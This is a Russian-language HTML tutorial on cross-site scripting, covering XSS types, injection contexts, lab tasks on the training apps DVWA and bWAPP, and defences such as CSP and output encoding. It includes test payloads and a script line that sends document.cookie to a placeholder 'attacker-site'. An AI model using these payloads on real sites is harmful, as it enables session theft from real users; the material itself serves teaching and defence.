<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Уязвимости: Полное руководство</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #000000; /* Черный текст */
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f9f9f9;
        }
        
        h1, h2, h3, h4 {
            color: #000000; /* Черные заголовки */
            margin-top: 30px;
        }
        
        h1 {
            border-bottom: 2px solid #2e8b57; /* Темно-зеленая граница */
            padding-bottom: 10px;
        }
        
        .section {
            background-color: white;
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 30px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            border: 1px solid #e0e0e0;
        }
        
        .xss-type {
            background-color: #f8f9fa;
            border-left: 4px solid #2e8b57; /* Темно-зеленая граница */
            padding: 15px;
            margin: 15px 0;
        }
        
        .code-block {
            background-color: #f0f0f0;
            padding: 15px;
            border-radius: 5px;
            font-family: Consolas, Monaco, 'Andale Mono', monospace;
            overflow-x: auto;
            white-space: pre-wrap;
            color: #000000; /* Черный текст в блоках кода */
        }
        
        .image-note {
            font-style: italic;
            color: #666;
            text-align: center;
            margin: 10px 0;
        }
        
        .protection-list {
            background-color: #e8f4f0; /* Светло-зеленый фон */
            padding: 20px;
            border-radius: 5px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        
        table, th, td {
            border: 1px solid #ddd;
        }
        
        th {
            background-color: #2e8b57; /* Темно-зеленый заголовок таблицы */
            color: white;
        }
        
        tr:nth-child(even) {
            background-color: #f2f2f2;
        }
        
        .task {
            margin-bottom: 40px;
            padding-bottom: 20px;
            border-bottom: 1px solid #e0e0e0;
        }
        
        a {
            color: #2e8b57; /* Зеленые ссылки */
            text-decoration: none;
        }
        
        a:hover {
            color: #3cb371; /* Светло-зеленый при наведении */
            text-decoration: underline;
        }
        
        .button {
            display: inline-block;
            padding: 10px 20px;
            background-color: #2e8b57; /* Темно-зеленая кнопка */
            color: white;
            border-radius: 5px;
            text-align: center;
            margin: 10px 5px;
            transition: background-color 0.3s;
        }
        
        .button:hover {
            background-color: #3cb371; /* Светло-зеленый при наведении */
        }
    </style>
</head>
<body>
    <h1>XSS уязвимости (Cross-Site Scripting — межсайтовый скриптинг)</h1>
    
    <div class="section">
        <h2>Теория</h2>
        
        <h3>Определение</h3>
        <p>XSS (англ. Cross-Site Scripting – «межсайтовый скриптинг») встречается в веб-приложениях. Атаки XSS возникают из-за недостаточной фильтрации данных, отправляемых пользователем для вставки в веб-страницу. Суть уязвимости заключается в возможности внедрения кода на страницу, которую просматривают другие пользователи, и взаимодействии этого кода с веб-сервером злоумышленника. Запуск скрипта предоставит злоумышленнику доступ к информации типа «Пользователь-сайт», при этом браузер будет думать, что код запущен из доверенного источника.</p>
    </div>
    
    <div class="section">
        <h2>Виды XSS</h2>
        
        <div class="xss-type">
            <h3>Stored XSS:</h3>
            <p>Сохраненный межсайтовый скриптинг (также известный как XSS второго порядка или постоянный) возникает, когда приложение получает данные из ненадежного источника и включает эти данные в свои последующие HTTP-ответы небезопасным способом. Код запускается каждый раз, когда пользователь посещает конкретный сайт.</p>
        </div>
        
        <div class="xss-type">
            <h3>Reflected XSS:</h3>
            <p>Отраженный XSS включает внедрение вредоносного исполняемого кода в HTTP-ответ. Вредоносный скрипт не находится в веб-приложении и не сохраняется. Браузер жертвы выполняет атаку только в том случае, если пользователь открывает веб-страницу или ссылку, созданную злоумышленником.</p>
            <p>Один запрос и ответ браузера доставляет и выполняет полезную нагрузку атаки. Созданные параметры HTTP или URI содержат строку атаки, которую веб-приложение обрабатывает неправильно. Особое внимание можно уделить соответствующим функциям приложения, таким как комментарии к сообщениям в блоге. Когда отправленное значение наблюдается в ответе, необходимо определить, действительно ли данные хранятся в разных запросах, а не просто отражаются в немедленном ответе.</p>
        </div>
        
        <div class="xss-type">
            <h3>DOM XSS</h3>
            <p>XSS на основе DOM, также известная как XSS типа 0, представляет собой атаку XSS, в которой полезная нагрузка атаки выполняется путем изменения DOM в браузере жертвы. Это приводит к тому, что клиент запускает код без ведома или согласия пользователя. Сама страница (т. е. HTTP-ответ) не изменится, но злонамеренное изменение в среде DOM приведет к тому, что клиентский код, содержащийся на странице, будет выполняться по-другому.</p>
            <p>Это отличается от отраженных или сохраненных атак XSS, которые размещают полезную нагрузку на страницу ответа из-за уязвимостей на стороне сервера. DOM XSS – это уязвимость на стороне клиента.</p>
        </div>
        
        <div class="xss-type">
            <h3>Blind XSS</h3>
            <p>Является частным случаем Stored XSS. Его отличительной чертой является то, что данные, вводимые злоумышленником, и сохраняемые на сервере, отображаются в другой части веб-приложения.</p>
        </div>
        
        <div class="xss-type">
            <h3>Self XSS</h3>
            <p>Self-XSS (self cross-site scripting) – это атака социальной инженерии, используемая для получения контроля над веб-учетными записями жертв. При самостоятельной XSS-атаке жертва атаки неосознанно запускает вредоносный код в своем собственном веб-браузере, тем самым предоставляя личную информацию злоумышленнику, своего рода уязвимость, известная как межсайтовый скриптинг. Self-XSS работает путем обмана пользователей, также заставляя их копировать и вставлять вредоносный контент в консоль веб-разработчика их браузеров.</p>
        </div>
    </div>
    
    <div class="section">
        <h2>Как проверить, к какому типу относится инъекция (Reflected, Stored, DOM, Self или Blind)</h2>
        <p>Чтобы проверить, к какому типу относится инъекция необходимо знать информацию об инъекции, а также их отличительные особенности (ключевые моменты).</p>
        
        <table>
            <tr>
                <th>Тип инъекции</th>
                <th>Ключевые особенности</th>
            </tr>
            <tr>
                <td>Stored</td>
                <td>Существует возможность внедрения кода в веб-страницу, которую просматривают другие пользователи сайта. Ключевой момент: постоянные XSS не требуют от жертвы участия, ей достаточно просто открыть страницу с хранимой XSS. Как только жертва обращается к сохраненной информации, она вместе с информацией получает вредоносный скрипт.</td>
            </tr>
            <tr>
                <td>Reflected</td>
                <td>Данные возвращаются пользователю сразу и при этом не проверяются. Также ключевой момент: атака не сработает, пока злоумышленник не отправит ссылку другим пользователям сайта.</td>
            </tr>
            <tr>
                <td>DOM</td>
                <td>Инъекция осуществляется в параметры структуры DOM, в частности document.url, document.location и document.referrer. Общий принцип в целом совпадает с предыдущими (происходит запуск кода без его проверки). Но ключевой момент: нельзя отследить наличие кода инъекции в отображаемой HTML-странице, т.к. вредоносный скрипт не уходит на сервер, а выполняется (и может оставаться) непосредственно в браузере пользователя.</td>
            </tr>
            <tr>
                <td>SELF</td>
                <td>Только сам пользователь сайта может выполнить код, который приводит к XSS. Ключевой момент: чтобы эксплуатировать Self XSS, злоумышленник должен заставить пользователя выполнить нужный ему код, поэтому злоумышленники прибегают к социальной инженерии при эксплуатации Self XSS.</td>
            </tr>
            <tr>
                <td>Blind XSS</td>
                <td>Является частным случаем Stored XSS. Она возникает, когда данные, вводимые злоумышленником, сохраняются на сервере, но отображаются в другой части приложения или вообще в другом приложении, отличном от того, в котором они были введены. Ключевой момент: код злоумышленника не обязательно выполнится именно в какой-либо форме, обычно это какой-то внешний сервис.</td>
            </tr>
        </table>
    </div>
    
    <div class="section">
        <h2>Контексты XSS</h2>
        <p>При тестировании отраженных и сохраненных XSS ключевой задачей является идентификация контекста XSS: местоположение в ответе, где отображаются данные, контролируемые злоумышленником. Любая проверка входных данных или другая обработка, выполняемая приложением для этих данных. Основываясь на этих деталях, можно выбрать одну или несколько потенциальных полезных нагрузок XSS и проверить, эффективны ли они, и отфильтровать по событиям и тегам и посмотреть, какие векторы требуют взаимодействия с пользователем.</p>
        
        <h3>Простой HTML контекст</h3>
        <p>Возникает в теле существующего HTML-тега или в начале (конце) страницы вне тега</p>
        <div class="code-block">&lt;html_tag&gt;user_input&lt;/html_tag&gt;
&lt;img src=x onerror=alert(1)&gt;</div>
        
        <h3>Контекст HTML-комментариев</h3>
        <p>Внутри секции комментариев HTML</p>
        <div class="code-block">&lt;!--comment user_input comment--&gt;
--&gt;&lt;img src=x onerror=alert(1)&gt;</div>
        
        <h3>Контекст имени HTML атрибута</h3>
        <p>Внутри открытого HTML тэга, после имени тэга или после значения атрибута.</p>
        <div class="code-block">&lt;html_tag user_input attr_name="attrib_value"/&gt;</div>
        
        <h3>Контекст значения HTML атрибута</h3>
        <p>Внутри открытого HTML тэга, после имени атрибута отделённого символом =.</p>
        <div class="code-block">&lt;html_tag attr_name="user_input"/&gt;</div>
        <p>Есть три вариации этого контекста:</p>
        <ul>
            <li>атрибут внутри двойных кавычек;</li>
            <li>атрибут внутри одинарных кавычек;</li>
            <li>атрибут без кавычек.</li>
        </ul>
        
        <h3>Атрибуты события</h3>
        <p>Значения этих атрибутов выполняются как JavaScript. Тоже самое, что и JavaScript контекст.</p>
        
        <h3>URL атрибуты</h3>
        <p>Эти атрибуты принимают URL в качестве значения.</p>
        
        <h3>Специальные URL атрибуты</h3>
        <p>Это URL атрибуты, где ввод обычных URL может привести к проблемам безопасности.</p>
        
        <h3>Атрибуты тега МЕТА</h3>
        <p>Meta теги, такие как Charset, могут влиять на то, как содержимые страницы интерпретируется браузером. И есть атрибут http-equiv, который может эмулировать поведение заголовков ответа HTTP. Воздействия на значения заголовков Content-Type, Set-Cookie.</p>
        
        <h3>Обычные атрибуты</h3>
        <p>Если ввод появляется в значениях обычных атрибутов, то этот контекст должен быть экранирован, чтобы это привело к выполнению кода.</p>
        
        <h3>Контекст JavaScript</h3>
        <p>Внутри раздела страницы JavaScript кода.</p>
        <div class="code-block">&lt;script&gt;
any_javascript
user_input
any_javascript
&lt;/script&gt;</div>
    </div>
    
    <div class="section">
        <h2>Поиск XSS уязвимостей</h2>
        <p>Наиболее вероятное место размещения XSS-уязвимости на сайте – это то место, куда обычный пользователь может добавить текст или JavaScript-код. В качестве простых и распространенных проверок на наличие данной уязвимости можно использовать код, который после успешной отработки откроет пользователю стандартное браузерное окно, например, alert. Также нужно обращать внимание на get-параметры запроса, передающиеся в URL запросе, если в get-параметре при поиске появился запрос, то велика вероятность, что страница подвержена уязвимости. В этом случае в тот же код (&lt;script&gt;alert(1)&lt;/script&gt;) вместо запроса подставляем get-параметр и обновляем страницу. В случае успеха в браузере появится окно с 1.</p>
        
        <p>Например при помощи следующего скрипта:</p>
        <div class="code-block">&lt;script&gt;window.location='http://attacker-site/?cookie='+document.cookie&lt;/script&gt;</div>
        
        <p>Можно создать HTTP-запрос на другой URL-адрес, который перенаправляет браузер пользователя на сервер атакующего. URL-адрес включает в себя куки жертвы в качестве параметра запроса. Когда HTTP-запрос приходит на сервер атакующего, он может извлечь эти куки из запроса. После того, как злоумышленник получил куки, он может использовать их, чтобы выдать себя за жертву и начать последующее нападение.</p>
    </div>
    
    <div class="section">
        <h2>Практика (данная практика из блока уязвимостей metasploitable 3)</h2>
        
        <div class="task">
            <h3>Задание 1. Уязвимость XSS (Stored) проекта DVWA на простом (Low) уровне сложности.</h3>
            <p>Перейдем на страницу XSS (Stored) проекта DVWA:</p>
            <p class="image-note">[Здесь был бы скриншот страницы DVWA]</p>
            
            <p>Попробуем отправить в качестве сообщения HTML-теги:</p>
            <p class="image-note">[Здесь был бы скриншот с HTML-тегами]</p>
            
            <p>Видим, что в поле Message отобразился отформатированный тегом h1 текст. Это означает, что текст вместе с форматированием сохраняется на сервере и возвращается пользователю отформатированным:</p>
            <p class="image-note">[Здесь был бы скриншот отформатированного текста]</p>
            
            <p>Теперь попробуем сохранить на странице скрипт &lt;script&gt;alert(document.cookie)&lt;/script&gt;:</p>
            <p class="image-note">[Здесь был бы скриншот с введенным скриптом]</p>
            
            <p>Видим всплывающее окно и куки, т. е. XSS есть:</p>
            <p class="image-note">[Здесь был бы скриншот всплывающего окна с куками]</p>
            
            <p>Можно теперь зайти на страницу несколько раз и увидеть результат выполнения скрипта:</p>
            <p class="image-note">[Здесь был бы скриншот повторного выполнения]</p>
            
            <p>Если открыть исходный код страницы, в нем можно найти те записи, которые есть в таблице, прямо вместе с тегами:</p>
            <p class="image-note">[Здесь был бы скриншот исходного кода]</p>
            
            <p>Как мы можем видеть, исполняемый код попадает и сохраняется на сервере именно таким, каким он был отправлен на сервер, даже сохраняются теги. Когда страница будет возвращена пользователю, скрипт будет выполнен. В данной атаке мы использовали следующий вектор атаки: &lt;script&gt;payload&lt;/script&gt;, вместо payload был использован alert(document.cookie).</p>
            <p>Модель безопасности в Интернете базируется на политике одинакового источника. Политика одинакового источника (same-origin policy) определяет как документ или скрипт, загруженный из одного источника (origin), может взаимодействовать с ресурсом из другого источника. Это помогает изолировать потенциально вредоносные документы, снижая количество возможных векторов атак.</p>
            <p>XSS позволяет обойти SOP. Поэтому для защиты от атак Reflected XSS необходимо выполнить следующее:</p>
            <ul>
                <li>Внедрить политику безопасности контента Content Security Policy (CSP)</li>
                <li>Производить проверку (фильтрацию) данных, которые передаются Также в некоторых случаях необходимо использование парсеров. Существует достаточное количество библиотек для парсинга, поэтому найти и использовать подходящий, не должно быть большой проблемой.</li>
            </ul>
        </div>
        
        <div class="task">
            <h3>Задание 2. Уязвимость XSS (Reflected) проекта DVWA на простом (Low) уровне сложности.</h3>
            <p>Перейдем на страницу XSS (Reflected) проекта DVWA (вводимые данные не проверяются):</p>
            <p class="image-note">[Здесь был бы скриншот страницы DVWA]</p>
            
            <p>Попробуем передать туда строку и найти ее в исходном коде страницы, которую вернет сервер:</p>
            <p class="image-note">[Здесь был бы скриншот с введенной строкой]</p>
            
            <p>Посмотрим, что отобразилось в выводе приветствия:</p>
            <p class="image-note">[Здесь был бы скриншот вывода]</p>
            
            <p>Если открыть исходный код страницы, мы можем найти введенную строку:</p>
            <p class="image-note">[Здесь был бы скриншот исходного кода]</p>
            
            <p>Попробуем передать в уязвимый параметр скрипт такого вида: &lt;script&gt;alert(document.cookie)&lt;/script&gt; и посмотрим, что получится:</p>
            <p class="image-note">[Здесь был бы скриншот с введенным скриптом]</p>
            
            <p>Браузер вернул куки:</p>
            <p class="image-note">[Здесь был бы скриншот всплывающего окна]</p>
            
            <p>Теперь снова посмотрим на исходный код возвращенной страницы:</p>
            <p class="image-note">[Здесь был бы скриншот исходного кода]</p>
            
            <p>Для защиты от данного типа необходимо выполнить следующее:</p>
            <ul>
                <li>Внедрить политику безопасности контента Content Security Policy (CSP)</li>
                <li>Производить проверку (фильтрацию) данных, которые передаются</li>
            </ul>
        </div>
        
        <div class="task">
            <h3>Задание 3. Уязвимость XSS (DOM) проекта DVWA на простом (Low) уровне сложности.</h3>
            <p>Перейдем на страницу XSS (DOM) проекта DVWA:</p>
            <p class="image-note">[Здесь был бы скриншот страницы DVWA]</p>
            
            <p>Посмотрев исходники данной страницы, видим, что никакой защиты нет:</p>
            <p class="image-note">[Здесь был бы скриншот исходного кода]</p>
            
            <p>Протестируем нашу страницу, нажав на кнопку «Select»:</p>
            <p class="image-note">[Здесь был бы скриншот страницы с кнопкой]</p>
            
            <p>Видно, что ссылка изменилась, данные передаются методом «GET». В адресной строке URL мы можем попробовать ввести вредоносный код:</p>
            <p class="image-note">[Здесь был бы скриншот URL с параметром]</p>
            
            <p>Вместо слова «English» введем простой скрипт на JavaScript, например, скрипт с alert: &lt;script&gt;alert('Hello World!')&lt;/script&gt;, и он выводит следующее всплывающее окно на странице:</p>
            <p class="image-note">[Здесь был бы скриншот всплывающего окна]</p>
        </div>
        
        <div class="task">
            <h3>Задание 4. Наличие XSS вектора, который использует событие onerror, на странице XSS – Reflected GET проекта bWAPP.</h3>
            <p>Перейдем на страницу XSS – Reflected GET проекта bWAPP:</p>
            <p class="image-note">[Здесь был бы скриншот страницы bWAPP]</p>
            
            <p>Реализуем простой HTML-контекст, используя событие onerror. Контекст возникает в теле существующего HTML-тега или в начале и в конце страницы вне тега. В этом контексте вместо данных можно вписать валидный HTML любого рода, и он немедленно будет воспроизведен браузером. Например, такой:</p>
            <p class="image-note">[Здесь был бы скриншот с введенным кодом]</p>
            
            <p>Это и есть простой HTML-контекст внедрения XSS. В рамках него пользовательский ввод будет выполнен с выполнением всего форматирования:</p>
            <p class="image-note">[Здесь был бы скриншот результата]</p>
            
            <p>Для защиты от данного типа необходимо выполнить следующее:</p>
            <ul>
                <li>Внедрить политику безопасности контента Content Security Policy (CSP)</li>
                <li>Производить проверку (фильтрацию) данных, которые передаются</li>
            </ul>
        </div>
        
        <div class="task">
            <h3>Задание 5. Уязвимость XSS на странице XSS – Stored (Coookies) проекта bWAPP на простом (Low) уровне сложности.</h3>
            <p>Перейдем на страницу XSS – Stored (Coookies) проекта bWAPP:</p>
            <p class="image-note">[Здесь был бы скриншот страницы bWAPP]</p>
            
            <p>Настроим Proxy в браузере:</p>
            <p class="image-note">[Здесь был бы скриншот настроек прокси]</p>
            
            <p>Запустим утилиту BurpSuite:</p>
            <p class="image-note">[Здесь был бы скриншот BurpSuite]</p>
            <p class="image-note">[Здесь был бы второй скриншот BurpSuite]</p>
            
            <p>На сайте выберем любимый жанр (например, Science Fiction):</p>
            <p class="image-note">[Здесь был бы скриншот выбора жанра]</p>
            
            <p>Перейдем в BurpSuite:</p>
            <p class="image-note">[Здесь был бы скриншот перехваченного запроса]</p>
            
            <p>Поменяем выбранный жанр sci-fi на Comedy (при этом в cookie пока нет значения movie_genry) и отправим запрос (Forward):</p>
            <p class="image-note">[Здесь был бы скриншот измененного запроса]</p>
            
            <p>Выберем снова жанр:</p>
            <p class="image-note">[Здесь был бы скриншот повторного выбора]</p>
            
            <p>Как мы видим, жанр Comedy отобразился в cookie:</p>
            <p class="image-note">[Здесь был бы скриншот куки]</p>
        </div>
    </div>
    
    <div class="section protection-list">
        <h2>Выводы: Защита от XSS</h2>
        <p>Защита от отраженного XSS в первую очередь заключается в том, чтобы избежать использования динамического вредоносного контента из HTTP-запросов для встраивания скриптов в уязвимое приложение. Некоторые подходы к достижению этого включают:</p>
        
        <h3>Подтвердить ввод пользователя</h3>
        <p>Проверка пользовательского ввода/фильтрация контента формирует первую линию защиты от большинства XSS-атак, включая отраженные XSS. Крайне важно рассматривать пользовательский ввод из любого источника как ненадежный и сформулировать механизмы проверки на соответствие семантическим и грамматическим требованиям. Команды безопасности также должны применять белые/черные списки для шаблонов данных, которые должны быть приняты или отклонены. Кроме того, группам контроля качества и администраторам рекомендуется рассматривать данные как от аутентифицированных, так и от общедоступных пользователей как ненадежные входные данные, применяя одни и те же методы очистки входных данных для всех пользователей.</p>
        
        <h3>Избегать динамического контента</h3>
        <p>Предположим, что приложение использует управляемые пользователем данные как часть своих HTTP-ответов. В этом случае выходные данные должны быть закодированы таким образом, чтобы сервер не интерпретировал их как активное содержимое. Это гарантирует, что любые специальные символы из хранилища данных приложения обрабатываются как содержимое тега HTML, а не как необработанный HTML. Рекомендуется заменить любые значимые динамические символы схемами кодирования объектов HTML для безопасной интерпретации. Разработчикам следует использовать специальные инструменты для включения безопасной таблицы стилей и кодирования скриптов, если динамическое содержимое вставляется в теги &lt;script&gt; и &lt;style&gt;.</p>
        
        <h3>Внедрить политику безопасности контента</h3>
        <p>Надежная политика безопасности содержимого позволяет веб-администраторам/разработчикам контролировать, откуда веб-страница может загружать и выполнять сценарии. Поскольку отраженная атака XSS основана на внедрении злоумышленником вредоносного контента на веб-страницу, CSP предотвращают атаки, указывая источники встроенных сценариев. Большинство современных браузеров поддерживают CSP, что делает их одним из наиболее важных аспектов предотвращения отраженных XSS-атак.</p>
        
        <h3>Использовать инструмент сканирования уязвимостей</h3>
        <p>Инструменты сканирования уязвимостей автоматически тестируют веб-приложения и лежащий в их основе исходный код для выявления слабых в безопасности, которые могут привести к успешному выполнению XSS-атак. Crashtest Security Suite включает инструмент XSS, который может сканировать JavaScript и веб-приложения на наличие уязвимостей, таких как XSS, без ложных срабатываний.</p>
    </div>
</body>
</html>